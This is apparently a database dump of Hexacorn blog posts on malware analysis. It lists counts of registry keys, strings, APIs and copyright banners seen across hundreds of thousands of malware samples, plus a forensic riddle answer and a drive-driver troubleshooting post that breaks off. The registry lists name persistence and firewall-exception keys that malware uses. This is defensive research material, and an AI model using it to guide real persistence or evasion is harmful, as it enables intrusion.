Agent\r\n   2400 Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\\r\n   2339 Software\\Valve\\Half-Life\\Settings\r\n   2308 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Hotfix\\Q246009\r\n   2299 Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n   2249 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices\r\n   2244 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\r\n   2234 Software\\Ask.com.tmp\r\n   2133 Software\\Valve\\CounterStrike\\Settings\r\n   2107 SOFTWARE\\Microsoft\\Shared Tools\\MSConfig\\startupreg\r\n   2099 SOFTWARE\\Microsoft\\Shared Tools\\MSConfig\\startupfolder\r\n   2098 Software\\Activision\\Soldier of Fortune II - Double Helix\r\n   2033 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\\r\n   1941 Software\\Eugen Systems\\The Gladiators\r\n   1931 Software\\AppDataLow\r\n   1866 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop\r\n   1851 SOFTWARE\\WinRAR\r\n   1842 Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\r\n   1841 Software\\ASProtect\\Key\r\n   1833 Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\\%s\r\n   1829 Software\\Unreal Technology\\Installed Apps\\UT2003\r\n   1822 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\r\n   1813 Software\\Valve\\Gunman\\Settings\r\n   1811 Software\\JoWooD\\InstalledGames\\IG2\r\n   1807 Software\\Electronic Arts\\EA GAMES\\Generals\\ergc\r\n   1802 Software\\Microsoft\\Protected Storage System Provider\r\n   1798 Software\\Silver Style Entertainment\\Soldiers Of Anarchy\\Settings\r\n   1791 Software\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc\r\n   1761 Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\NewStartPanel\r\n   1687 Software\\Microsoft\\Internet Explorer\\New Windows\\Allow\r\n   1686 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\\\r\n   1665 Software\\Microsoft\\Internet Explorer\\SearchScopes\r\n   1646 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\r\n   1617 Software\\Westwood\\Tiberian Sun\r\n   1606 Software\\Westwood\\Red Alert 2\r\n   1576 Software\\3d0\\Status\r\n   1571 Software\\Electronic Arts\\EA Sports\\NHL 2003\\ergc\r\n   1571 Software\\Electronic Arts\\EA Sports\\NHL 2002\\ergc\r\n   1570 Software\\Techland\\Chrome\r\n   1570 Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Google Chrome\r\n   1570 Software\\Microsoft\\Windows\r\n   1565 Software\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc\r\n   1563 Software\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc\r\n   1560 Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2\r\n   1560 Software\\Microsoft\\%s %s Manager\\%ss\r\n   1560 Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII\\ergc\r\n   1559 Software\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome\\ergc\r\n   1555 Software\\Electronic Arts\\EA Sports\\Nascar Racing 2002\\ergc\r\n   1553 Software\\Electronic Arts\\EA Sports\\Nascar Racing 2003\\ergc\r\n   1545 Software\\Westwood\\Red Alert\r\n   1541 Software\\Fenomen Games\\Game Downloader\\1.1\\Completed\r\n   1534 Software\\Illusion Softworks\\Hidden & Dangerous 2\r\n   1528 Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\SharedTaskScheduler\r\n   1515 Software\\Unreal Technology\\Installed Apps\\UT2004\r\n   1502 Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\\r\n   1490 Software\\Electronic Arts\\EA GAMES\\Battlefield Vietnam\\ergc\r\n   1483 SOFTWARE\\Mozilla\\Mozilla Firefox\r\n   1481 Software\\Red Storm Entertainment\\RAVENSHIELD\r\n   1478 Software\\Westwood\\NOX\r\n   1478 Software\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour\\ergc\r\n   1475 Software\\IGI 2 Retail\r\n   1474 Software\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2\r\n   1472 Software\\Electronic Arts\\EA GAMES\\Need For Speed Underground\\ergc\r\n   1461 Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead\\ergc\r\n   1461 Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough\\ergc\r\n   1460 Software\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition\\ergc\r\n   1460 Software\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault\\ergc\r\n   1459 Software\\Electronic Arts\\EA GAMES\\Black and White\\ergc\r\n   1458 Software\\Policies\\Microsoft\\Internet Explorer\\Restrictions\r\n   1458 Software\\Electronic Arts\\EA GAMES\\Global Operations\\ergc\r\n   1458 Software\\Electronic Arts\\EA Distribution\\Freedom Force\\ergc\r\n   1457 Software\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire\\ergc\r\n   1456 Software\\Yahoo\\Pager\\View\\YMSGR_Launchcast\r\n   1433 SOFTWARE\\Classes\\http\\shell\\open\\commandV\r\n   1405 Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop\r\n   1373 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run\r\n   1373 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\r\n   1351 SOFTWARE\\Microsoft\\Windows NT Script Host\\Microsoft DxDiag\\WinSettings\r\n   1342 SOFTWARE\\Vitalwerks\\DUC\r\n   1337 SOFTWARE\\Policies\\Microsoft\\Windows\\Installer\r\n   1300 Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\EscDomains\\\r\n   1296 SOFTWARE\\CnNuo20\\socket\r\n   1287 Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\http\\UserChoice\r\n   1246 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\netcache\r\n   1246 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\r\n   1224 SOFTWARE\\Microsoft\\Active Setup\\Installed Components\r\n   1214 Software\\Yahoo\\Pager\\View\\YMSGR_buzz\r\n   1195 Software\\Microsoft\\Internet Explorer\\TypedAddress\r\n   1190 SOFTWARE\\Microsoft\\IDSCNP\r\n   1177 Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\r\n   1170 SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\r\n   1165 SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\\r\n   1165 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows]\r\n   1150 Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\r\n   1136 Software\\Microsoft\\Internet Explorer\\Desktop\\General\r\n   1129 Software\\EGDHTML\r\n   1125 Software\\Microsoft\r\n   1121 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run\\\r\n   1111 Software\\Microsoft\\Internet Explorer\\Toolbar\r\n   1102 Software\\Microsoft\\Windows\\CurrentVersion\\Network\\LanMan\r\n   1075 Software\\Microsoft\\Internet Explorer\\Toolbar\\WebBrowser\r\n   1059 Software\\Zylom\\MyZylom\\Credentials\r\n   1058 Software\\Microsoft\\Windows\\CurrentVersion\\\r\n   1054 SOFTWARE\\Microsoft\\Shared Tools\\MSConfig\\startupreg\\\r\n   1049 SOFTWARE\\Microsoft\\Shared Tools\\MSConfig\\startupfolder\\\r\n   1040 Software\\microsoft\\windows\\currentversion\\Explorer\\shellexecutehooks\r\n   1039 Software\\Borland\\Database Engine\r\n   1034 Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\Zones\\3\r\n   1034 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\run\r\n   1023 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Ratings\\PICSRules\\.Default\\0\\PRPolicy\\\r\n   1023 SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Ratings\\PICSRules\\.Default\\0\\PRPolicy\r\n   1016 Software\\Yahoo\\Pager\\View\\YMSGR_Calendar\r\n   1016 Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\IEXPLORE.EXE\r\n   1013 Software\\AppDataLow\\RivalGamingData\r\n   1009 Software\\Classes\\CLSID\\%s\\InprocServer32\r\n   1002 Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\HideDesktopIcons\\ClassicStartMenu\r\n\r\n\'SYSTEM\\\'\r\n  52751 System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x\r\n  14516 SYSTEM\\CurrentControlSet\\Services\\\r\n   6913 SYSTEM\\CurrentControlSet\\Control\\Keyboard Layouts\\\r\n   5894 SYSTEM\\CurrentControlSet\\Services\\%s\r\n   4994 SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\r\n   4170 SYSTEM\\CurrentControlSet\\Control\\Lsa\r\n   3361 SYSTEM\\CurrentControlSet\\services\\SharedAccess\\Parameters\\FirewallPolicy\\FirewallRules\r\n   3081 SYSTEM\\CurrentControlSet\\Control\\ProductOptions\r\n   3022 System\\CurrentControlSet\\Control\\Session Manager\r\n   2722 SYSTEM\\CurrentControlSet\\Control\\Terminal Server\r\n   2575 SYSTEM\\CurrentControlSet\\Services\r\n   2547 SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\r\n   2486 System\\CurrentControlSet\\Services\\\r\n   2388 System\\CurrentControlSet\\Control\\Session Manager\\FileRenameOperations\r\n   1468 SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\r\n   1416 SYSTEM\\\r\n   1397 system\\sservice.exe\r\n   1341 SYSTEM\\CurrentControlSet\\Services\\TermService\r\n   1316 SYSTEM\\CurrentControlSet\\Services\\TermDD\r\n   1303 SYSTEM\\CurrentControlSet\\Control\\Session Manager\r\n   1215 SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\r\n   1213 SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds\\tcp\r\n   1203 SYSTEM\\ControlSet001\\Services\\\r\n   1171 SYSTEM\\CurrentControlSet\\Services\\SharedAccess\r\n   1135 system\\\r\n   1086 SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\RDPTcp\r\n    964 SYSTEM\\ControlSet001\\Services\\%s\r\n    929 SYSTEM\\CurrentControlSet\\Services\\lanmanworkstation\\parameters\r\n    928 SYSTEM\\CurrentControlSet\\Services\\%s\\Performance\r\n    920 SYSTEM\\CurrentControlSet\\Services\\wscsvc\r\n    914 SYSTEM\\ControlSet001\\Control\\SafeBoot\r\n    882 System\\CurrentControlSet\\Control\\Windows\r\n    828 SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10318}\r\n    822 SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\{4D36E967-E325-11CE-BFC1-08002BE10318}\r\n    757 SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\r\n    702 SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\\r\n    695 SYSTEM\\ControlSet001\\Control\\SafeBoot\\Minimal\\{4D36E967-E325-11CE-BFC1-08002BE10318}\r\n    691 System\\CurrentControlSet\\Services\\VxD\\VNETSUP\r\n    691 SYSTEM\\ControlSet001\\Control\\SafeBoot\\Network\\{4D36E967-E325-11CE-BFC1-08002BE10318}\r\n    687 System\\\r\n    683 SYSTEM\\CurrentControlSet\\Services\\WinDHCPsvc\r\n    656 SYSTEM\\CurrentControlSet\\Control\r\n    618 System\\CurrentControlSet\\Control\r\n    608 SYSTEM\\CurrentControlSet\\services\\WinSock2\\Parameters\\Protocol_Catalog9\\Catalog_Entries\\000000000001\r\n    606 SYSTEM\\CurrentControlSet\\Services\\WinSock2\\Parameters\\Protocol_Catalog9\\Catalog_Entries\r\n    558 SYSTEM\\CurrentControlSet\r\n    556 SYSTEM\\CurrentControlSet\\Control\\SafeBoot\r\n    542 SYSTEM\\CurrentControlSet\\Services\\srservice\r\n    539 SYSTEM\\CurrentControlSet\\Services\\Messenger\r\n    517 SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters\r\n    496 System\\CurrentControlSet\\Control\\ProductOptions\r\n    481 SYSTEM\\CurrentControlSet\\Services\\RemoteRegistry\r\n    465 SYSTEM\\CurrentControlSet\\Services\\WinSock2\\speednet_sph\r\n    462 SYSTEM\\CurrentControlSet\\Services\\TlntSvr\r\n    455 SYSTEM\\CurrentControlSet\\Services\\RemoteAccess\\RouterManagers\\Ip\r\n    452 SYSTEM\\ControlSet001\\Control\\StorageDevicePolicies\\WriteProtect\r\n    437 System\\CurrentControlSet\\Services\\RemoteAccess\r\n    433 system\\CurrentControlSet\\Services\\VxD\\VNETSUP\r\n    413 System\\CurrentControlSet\\Services\\SharedAccess\r\n    407 SYSTEM\\CurrentControlSet\\Services\\CelInDrv\r\n    404 System\\CurrentControlSet\\Control\\ComputerName\\ComputerName\r\n    395 SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\r\n    393 SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\r\n    382 SYSTEM\\MountedDevices\r\n    374 SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\\r\n    372 SYSTEM\\CurrentControlSet\\Control\\Nls\\Language\r\n    369 System\\CurrentControlSet\\Services\\10DD75E0\r\n    367 SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\r\n    364 SYSTEM\\CurrentControlSet\\Services\\wuauserv\r\n    359 SYSTEM\\ControlSet001\\Services\\srservice\r\n    355 SYSTEM\\CurrentControlSet\\Services\\navapsvc\r\n    353 system\\wininv.dll\r\n    352 system\\winkey.dll\r\n    351 SYSTEM\\ControlSet001\\Services\\navapsvc\r\n    338 SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\r\n    337 SYSTEM\\ControlSet002\\Control\\Terminal Server\\\r\n    318 SYSTEM\\CurrentControlSet\\Services\\BITS\\Parameters\r\n    314 SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E96D-E325-11CE-BFC1-08002BE10318}\\\r\n    313 SYSTEM\\CurrentControlSet\\Services\\10DD75E0\r\n    312 SYSTEM\\CurrentControlSet\\Services\\Winsock\\Parameters\r\n    310 SYSTEM\\CurrentControlSet\\Services\\Winsock2\\Parameters\r\n    295 SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\\r\n    294 System\\CurrentControlSet\\Services\\AE2CA9B0\r\n    290 SYSTEM\\InfoTime\r\n    288 system\\CurrentControlSet\\Services\r\n    284 SYSTEM\\CurrentControlSet\\Control\\nls\\codepage\r\n    280 SYSTEM\\ControlSet001\\Services\\kspooldaemon\r\n    279 system\\cURRENTcONTROLsET\\sERVICES\\%s\r\n    278 System\\CurrentControlSet\\Services\\VxD\\MSTCP\r\n    273 System\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\r\n    272 SYSTEM\\CurrentControlSet\\Services\\ERSvc\r\n    271 System\\CurrentControlSet\\Control\\MPRServices\\TestService\r\n    270 SYSTEM\\ControlSet001\\Enum\\Root\\LEGACY_KSPOOLDAEMON\\0000\r\n    266 SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\r\n    262 SYSTEM\\CurrentControlSet\\Control\\Windows\r\n    261 System\\CurrentControlSet\\Control\\Lsa\r\n    254 System\\CurrentControlSet\\Services\\KAVsys\r\n    254 SYSTEM\\ControlSet003\\Services\\BITS\\Parameters\r\n    252 SYSTEM\\ControlSet001\\Services\\KSD2Service\r\n    239 SYSTEM\\ControlSet001\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List\\\r\n    238 SYSTEM\\ControlSet001\\Services\\wscsvc\r\n    232 SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName\r\n    230 SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\r\n    225 System\\CurrentControlSet\\Services\\Tcpip\\Parameters\r\n    223 SYSTEM\\CurrentControlSet\\Services\\AeLookupSvcs\r\n    214 system\\cURRENTcONTROLsET\\sERVICES\\\r\n    214 SYSTEM\\CurrentControlSet\\Services\\Schedule\r\n    210 SYSTEM\\CurrentControlSet\\Control\\Class\r\n    209 System\\CurrentControlSet\\Services\r\n    207 SYSTEM\\CurrentControlSet\\Services\\kkdc\r\n    205 System\\CurrentControlSet\\Services\\%s\r\n    202 SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\AuthorizedApplications\\List\r\n    198 SYSTEM\\ControlSet001\\Services\\wuauserv\r\n    194 SYSTEM\\CurrentControlSet\\Services\\NetBT\\Parameters\r\n    192 SYSTEM\\CurrentControlSet\\Services\\CSNetManagerXp\r\n    189 SYSTEM\\ControlSet001\\Services\\SharedAccess\r\n    188 System\\CurrentControlSet\\Services\\Class\\\r\n    185 SYSTEM\\CurrentControlSet\\Services\\Class\r\n    182 SYSTEM\\CurrentControlSet\\Services\\W32Time\\Parameters\r\n    180 System\\CurrentControlSet\\Services\\WinSock2\\Parameters\\\r\n    180 System\\CurrentControlSet\\Services\\E2C9CC2C\r\n    176 SYSTEM\\CurrentControlSet\\Services\\SSHNAS\r\n    175 System\\CurrentControlSet\\Control\\Class\\\r\n    175 SYSTEM\\Setup\r\n    175 SYSTEM\\CurrentControlSet\\Services\\BITS\r\n    174 SYSTEM\\CurrentControlSet\\Services\\DomainService\r\n    174 SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\\r\n    173 SYSTEM\\CurrentControlSet\\Services\\ManagereUpdate\r\n    172 SYSTEM\\CurrentControlSet\\Services\\WinSock2\\ESPI11\r\n    169 SYSTEM\\CurrentControlSet\\Services\\acpidisk\r\n    168 SYSTEM\\CurrentControlSet\\Services\\Ball\\\r\n    167 SYSTEM\\CurrentControlSet\\Services\\Medie Sariel Number Services\r\n    166 SYSTEM\\CurrentControlSet\\Services\\Kingsoft Antivirus WebShield Service\r\n    164 System\\WPA\\ApplianceServer\r\n    164 SYSTEM\\CurrentControlSet\\Services\\Ball\r\n    163 SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/07/20/random-stats-from-1m-samples-regkeys/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (352, 'Permanent Link to Random Stats from 1M samples – strings & APIs', 'Hexacorn', 'July 19, 2012 ', 'Thanks to VirusShare (thanks!!!), I recently doubled my malware collection and once I got the samples, I ran the same stats as I did with 300K samples\nThe results are not very surprising, but for the benefit of all, here they are – top 100 strings and APIs:\n71683194 ZYYd\r\n 9614600 SVWU\r\n 8510696 SVW3\r\n 5945175 QSVW\r\n 5146615 Self\r\n 5097074 Left\r\n 4901592 Width\r\n 4866679 Height\r\n 2661888 Y_^[\r\n 2610729 Z]_^[\r\n 2603363 TObject\r\n 2500401 Sender\r\n 2427775 SVWUQ\r\n 2221590 SVWQ\r\n 2098892 Integer\r\n 2041679 SSSSS\r\n 2004524 OnClick\r\n 1959797 TabOrder\r\n 1869961 ffffff\r\n 1839874 ParentFont\r\n 1799717 Z_^[\r\n 1685639 Font.Style\r\n 1685400 Font.Color\r\n 1684559 Font.Name\r\n 1679994 Font.Charset\r\n 1677779 Font.Height\r\n 1675337 TImage\r\n 1533562 Caption\r\n 1532251 SUVW\r\n 1523722 VVVVV\r\n 1330863 YZ^[\r\n 1330718 YZ]_^[\r\n 1289920 Boolean\r\n 1272777 Cursor\r\n 1245718 crHandPoint\r\n 1176021 Controls\r\n 1119964 kernel32.dll\r\n 1067711 Classes\r\n 1066917 TLabel\r\n 1057670 BorderStyle\r\n 1054490 Graphics\r\n 1044623 YZ_^[\r\n 1025276 clWindowText\r\n 1012871 Color\r\n  986327 ANSI_CHARSET\r\n  982837 TEdit\r\n  982375 QCCe\r\n  971709 MaxLength\r\n  967265 Forms\r\n  958946 bsNone\r\n  944070 GetProcAddress\r\n  915245 WWWWW\r\n  908645 GetModuleHandleA\r\n  890753 AutoSize\r\n  873797 OnChange\r\n  835864 D$ P\r\n  819162 fsBold\r\n  798371 IGGc\r\n  776076 LoadLibraryA\r\n  773533 DEFAULT_CHARSET\r\n  748235 Transparent\r\n  735901 MS Sans Serif\r\n  717404 CloseHandle\r\n  698784 Y_^][\r\n  685014 Visible\r\n  680888 ExitProcess\r\n  664088 GetModuleFileNameA\r\n  652008 WriteFile\r\n  640725 fffffffff\r\n  638676 VirtualAlloc\r\n  632279 user32.dll\r\n  627775 MessageBoxA\r\n  625640 Verdana\r\n  625252 OnKeyPress\r\n  621739 D$$P\r\n  605312 RegCloseKey\r\n  587883 CreateFileA\r\n  585205 D$(P\r\n  583562 Sleep\r\n  580111 GetLastError\r\n  575028 BBBB\r\n  548097 FreeLibrary\r\n  542390 VirtualFree\r\n  540328 D$,P\r\n  531015 SVWj\r\n  527326 PPPPP\r\n  526237 Create\r\n  520984 IKKe\r\n  512493 ReadFile\r\n  512283 RegQueryValueExA\r\n  503601 D$0P\r\n  499179 Menus\r\n  494051 SetFilePointer\r\n  491272 GetCurrentThreadId\r\n  486630 advapi32.dll\r\n  485213 RegOpenKeyExA\r\n  478247 FCCr\r\n  477028 OHHi\r\n  470003 L$ Q\r\n  469449 Enabled\r\n \r\nand APIs\r\n\r\n944070    GetProcAddress\r\n908645    GetModuleHandleA\r\n776076    LoadLibraryA\r\n717404    CloseHandle\r\n680888    ExitProcess\r\n664088    GetModuleFileNameA\r\n652008    WriteFile\r\n638676    VirtualAlloc\r\n627775    MessageBoxA\r\n605312    RegCloseKey\r\n587883    CreateFileA\r\n583562    Sleep\r\n580111    GetLastError\r\n548097    FreeLibrary\r\n542390    VirtualFree\r\n512493    ReadFile\r\n512283    RegQueryValueExA\r\n494051    SetFilePointer\r\n491272    GetCurrentThreadId\r\n485213    RegOpenKeyExA\r\n463534    GetStdHandle\r\n435175    EnterCriticalSection\r\n433130    LeaveCriticalSection\r\n431887    MultiByteToWideChar\r\n428780    GetCommandLineA\r\n426579    LocalAlloc\r\n426383    GetTickCount\r\n424661    DeleteCriticalSection\r\n416464    InitializeCriticalSection\r\n415052    GetStartupInfoA\r\n403254    FindClose\r\n399632    GetCurrentProcess\r\n391872    GetFileSize\r\n387944    GetLocaleInfoA\r\n386549    WideCharToMultiByte\r\n376113    FindFirstFileA\r\n368695    CreateThread\r\n355701    lstrlenA\r\n349823    RtlUnwind\r\n347012    WaitForSingleObject\r\n333669    UnhandledExceptionFilter\r\n329287    GetSystemMetrics\r\n327685    DeleteFileA\r\n324716    VirtualQuery\r\n323620    GetVersion\r\n322321    GetCurrentProcessId\r\n321928    GetVersionExA\r\n320611    SetEndOfFile\r\n314143    RaiseException\r\n313811    GetThreadLocale\r\n312354    LocalFree\r\n310272    TlsSetValue\r\n308747    TlsGetValue\r\n306651    CharNextA\r\n306325    GetACP\r\n295599    LoadStringA\r\n290795    TerminateProcess\r\n285458    GetCPInfo\r\n275774    RegSetValueExA\r\n275053    ShowWindow\r\n273978    InterlockedDecrement\r\n273819    GetDC\r\n273356    InterlockedIncrement\r\n268980    GetFileType\r\n261534    DeleteObject\r\n258627    SelectObject\r\n257670    HeapAlloc\r\n257553    GetActiveWindow\r\n250951    CreateProcessA\r\n249336    GlobalAlloc\r\n244183    VirtualProtect\r\n238796    SendMessageA\r\n237408    GetDeviceCaps\r\n235324    LoadLibraryExA\r\n231840    GetLastActivePopup\r\n228711    GlobalFree\r\n228678    GetSystemDirectoryA\r\n228410    DestroyWindow\r\n227835    HeapFree\r\n224168    GetTempPathA\r\n223629    QueryPerformanceCounter\r\n223618    DispatchMessageA\r\n223499    wsprintfA\r\n223381    SysFreeString\r\n221520    LoadResource\r\n219417    DeleteDC\r\n218877    CreateWindowExA\r\n214804    GetWindowRect\r\n213161    lstrcpynA\r\n212451    TranslateMessage\r\n208053    ReleaseDC\r\n207416    CompareStringA\r\n204825    SetEvent\r\n203100    RegCreateKeyExA\r\n202788    SizeofResource\r\n202324    GetClientRect\r\n201382    GetLocalTime\r\n200791    CreateEventA\r\n200663    SetTextColor\r\n200383    exit\r\n\r\n\r\n\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/07/19/random-stats-from-1m-samples-strings-apis/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (353, 'Permanent Link to Random stats from 300k malicious samples – copyright banners', 'Hexacorn', 'July 17, 2012 ', 'Some more stats from the 300K samples – this time copyright banners embedded inside the samples – these are all with 1000+ occurrences:\n  38186 Copyright (c) 1998 Hewlett-Packard Company\r\n   5944 Portions Copyright (c) 1983,99 Borland\r\n   4055 deflate 1.0.4 Copyright 1995-1996 Jean-loup Gailly\r\n   3580 deflate 1.2.3 Copyright 1995-2005 Jean-loup Gailly\r\n   3433 inflate 1.1.3 Copyright 1995-1998 Mark Adler\r\n   2858 Terms of use at https://www.verisign.com/rpa (c)041.0, \r\n   2654 inflate 1.2.3 Copyright 1995-2005 Mark Adler\r\n   2463 inflate 1.1.4 Copyright 1995-2002 Mark Adler\r\n   2390 Portions Copyright (c) 1999,2003 Avenger by NhT\r\n   2365 deflate 1.1.4 Copyright 1995-2002 Jean-loup Gailly\r\n   1823 Portions Copyright (c) 1983,97 Borland\r\n   1683 unzip 0.15 Copyright 1998 Gilles Vollant\r\n   1670 Copyright\r\n   1669 NO LIABILITY ACCEPTED, (c)97 VeriSign, Inc.0\r\n   1618 deflate 1.1.3 Copyright 1995-1998 Jean-loup Gailly\r\n   1492 Copyright (C) 2001, 2003 Radim Picha\r\n   1361 Copyright Flag\r\n   1354 Zip archive creation and modification Copyright 2000 Tadeusz Dracz\r\n\r\nAs you can imagine, the stats are not for a sole purpose of amusement.\r\nSoon, all of these will be added to HexDive :-)\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2012/07/17/random-stats-from-300k-malicious-samples-copyright-banners/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (354, 'Permanent Link to Forensic Riddle #12 – Answer', 'Hexacorn', 'July 8, 2012 ', 'There are many answers to this one.\nFor starters, consider triplet A, W, UTF8 instead of usual A,W in:\n\nDnsQueryExA\nDnsQueryExUTF8\nDnsQueryExW\n\nor\n\nDnsQuery_A\nDnsQuery_UTF8\nDnsQuery_W\n\nOther examples include:\n\nRunDll32ShimW for Unciode, but not ANSI version RunDll32ShimA\nGetHashFromFile for ANSI and GetHashFromFileW for Unicode\ntriplet ShellExec_RunDLL and ShellExec_RunDLLA for ANSI and ShellExec_RunDLLW for Unicode\n\nand many more…\nShare this :)', 'Forensic Riddles - Answers', 'http://www.hexacorn.com/blog/2012/07/08/forensic-riddle-12-answer/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (355, 'Permanent Link to My Book 1140 missing drivers a.k.a Western Digital incompatible Twin brothers', 'Hexacorn', 'July 6, 2012 ', 'Today I bought a second WD My Book Essentials 3TB as I was running out of space (sample analysis generate lots of data that has to be stored somewhere locally and I can’t afford better solution at the moment).\nI really like WD drives, so far they are the most reliable I know so I was happy to purchase a twin brother to my already heavily utilized 3TB. I thought I will just plug it in + start transferring some research data goodness to it immediately. To my surprise, anytime I connected first drive, everything was OK, but once the new drive was attached, I was getting a cryptic messages about ‘My Book 1140’ drivers not found.\nEnter ‘My Book 1140’ drivers nightmare \nGoogling around shows to a lot of posts of people having issues with this particular model. Some people suggesting that the hard drive is faulty and advising to replace it.\nAs usual, a typical troubleshooting path didn’t work. No drivers could be found in any way, upgrading Hard Drives firmware didn’t work, removing and reinstalling the USB devices from Device Manager didn’t work, reinstalling full WDC software package (sad piece of bloatware written using .NET) from the web site didn’t help either. Nada. Nothing worked and I was starting to get seriously pissed off.\nEnter forensics mode \nI started looking at registry settings under HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Enum\\USB and discovered that the 2 drives I purchased use slightly different Product IDs. The first one was listed under VID_1058&PID_1130 and the new one under VID_1058&PID_1140. \nVID 1058 is a Vendor ID for Western Digital Technologies, Inc. and PID is a Product ID of the drives. Because they are different, the system expects different drivers and apparently for the new one, it failed to install them properly. I dunno why, but this seems to be a really common issue.\nOf course, knowing that the drives I bought are almost identical and should work properly as a USB Mass Storage device with the same driver, I decided to help my system a bit \nI exported both entries from 1130 and 1140 and compared them visually; the sequences of exported values are different, but one can easy spot the missing or incorrect settings:\n\nIn particular:\n\n“Class”=”USB”\n“ConfigFlags”=dword:00000000 vs. “ConfigFlags”=dword:00000400\n\nand of course, the most important of them all:\n\n“Driver”=”{36fc9e60-c465-11cf-8056-444553540000}\\\\0103”\n\nEnter Mr. Registry Experimentator mode \nEditing 